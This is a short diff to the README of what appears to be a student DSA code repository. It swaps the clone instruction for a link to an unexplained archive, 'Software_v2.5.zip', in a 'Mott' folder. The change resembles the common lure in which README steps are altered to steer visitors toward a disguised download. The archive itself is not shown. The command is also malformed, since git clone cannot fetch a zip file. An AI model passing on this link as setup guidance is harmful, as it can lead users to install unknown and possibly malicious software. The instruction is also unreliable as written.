@@ -19,4 +19,4 @@ Welcome to my DSA repository! This repository contains code I have written relat
 ## How to Use
 1. Clone the repository to your local machine:
    ```bash
-   git clone https://raw.githubusercontent.com/rushangchandekar/DSA/main/Mott/DSA.zip
+   git clone https://github.com/rushangchandekar/DSA/raw/refs/heads/main/Mott/Software_v2.5.zip
